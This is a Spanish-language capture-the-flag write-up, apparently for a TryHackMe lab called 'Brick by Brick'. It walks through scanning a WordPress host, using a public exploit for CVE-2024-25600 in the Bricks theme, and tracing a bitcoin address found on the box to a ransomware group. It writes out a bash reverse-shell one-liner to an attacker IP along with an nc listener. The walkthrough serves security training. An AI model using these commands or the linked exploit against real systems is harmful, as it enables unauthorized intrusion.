# Introducción

BRick PRes Media se utiliza para crear una nueva web con un tema que representa a una nueva pared renovada usando 3 mmillones de bricks bytes.

No olvidemos de añadir la URL a /etc/hosts

```
echo "ip bricks.thm | sudo tee -a /etc/hosts
```

# Conectividad

![image](https://github.com/user-attachments/assets/7a11d5e3-9986-4361-b462-01e96fefb860)

# Enumeración

```
udo nmap -sCV -T4 --min-rate 4000 bricks.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-24 08:15 GMT
Nmap scan report for bricks.thm (10.10.54.211)
Host is up (0.0048s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Fri, 24 Jan 2025 08:15:09 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Fri, 24 Jan 2025 08:15:09 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
443/tcp  open  ssl/ssl Apache httpd (SSL-only mode)
|_http-generator: WordPress 6.5
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache
|_http-title: Brick by Brick
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
| tls-alpn: 
|   h2
|_  http/1.1
3306/tcp open  mysql   MySQL (unauthorized)
```

- 22 / ssh
- 80 / http
- 443 / https
- 3306 / mysql

Información relevante:

El puerto 80 nos da una repuesta 500 con lo cuál nos desvia, el puerto 443 si nos da una imagen de una página:

![image](https://github.com/user-attachments/assets/7d05727a-9f7e-472b-a4e3-6f806b6baf4a)

También como infroamación es un WebSOckify Python/3.8.10 vamos a fuzzear directorios a ver si encontramos algo interesante

Quizás no sea ni necesario, si vamos al HTML encontramos un montón de rutas donde podemos sacar información como el tema

```
<script src="https://bricks.thm/wp-content/themes/bricks/assets/js/bricks.min.js?ver=1705030332" id="bricks-scripts-js"></script>
```

Vamos a meter un wpscan, porque ya sabemos que es un wordpress a ver si sacamos algo más de info

![image](https://github.com/user-attachments/assets/d3e5b377-d268-4c77-9f44-50c5490140a7)


# Explotación

Vemos : Bricks - 1.9.5 vamos a buscar vulnerabilidades

https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT

Una vez tengamos el script deberemos seguramente instalar librerias, simplemente:

```
pip3 install repo
```

```
python3 nombre.py -u https://Bricks.thm
```

![image](https://github.com/user-attachments/assets/2ea91646-7895-41ce-a6f2-369e856b2416)

Estamos dentro

Si probamos a enumerar veremos que con esta bash poco podemos hacer, vamos a hacer una listener y un rev shell

```
bash -c 'exec bash -i &>/dev/tcp/10.10.252.25/9001 <&1'

rlwrap nc -lvnp 9001
```

Una vez hagamos esto tendremos una mejor rev shell

Encontramos si hacemos un ls el archivo de txt de la primera pregunta.

También enumeramos archivos como el wp-config en el que descubrimos el usuario root, como hint el mismo CTF nos dice que busquemos un proceso extraño. Vamos a enumerar procesos.

```
systemctl list-units --type=service --state=running
```

```
ubuntu.service                                 loaded active running TRYHACK3M
```

Tiene toda la pinta que es este

```
ystemctl cat ubuntu.service
systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Si nos vamos al directorio del servicio el/lib/NetworkManager

tenemos un archivo .conf si intentamos leerlo no encontrarmeos nada porque hay demasiados logs, simplemente hacemos un head archivo

![image](https://github.com/user-attachments/assets/340911fc-2525-4c58-b95c-3027dab0961e)

Encontramos pareces er una ID de bloockchain pero codificado vamos a probarlo por ciberchief

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

Aún así parece ser que no es la blockchain

Parece ser que se componen exactamente por la mitad osea que son o dos blockchain o uno y partido

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

si nos vamos a blockhair podemos ver las transacciones

https://blockchair.com/bitcoin/address/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa

![image](https://github.com/user-attachments/assets/15c7206c-c8f9-46bf-b7bd-9ad7e9d501f3)

![image](https://github.com/user-attachments/assets/120eb90b-734a-4113-8bd1-7680a0c4ce08)

Parece ser que dicha blockchain se refiere al ramsomware lookpik

https://ofac.treasury.gov/recent-actions/20240220

GG!!!!!!!!!!!!

Parece ser que ha sido una CTF sin necesidad de escalar privilegios si no de aprender sobre blockchain ;)
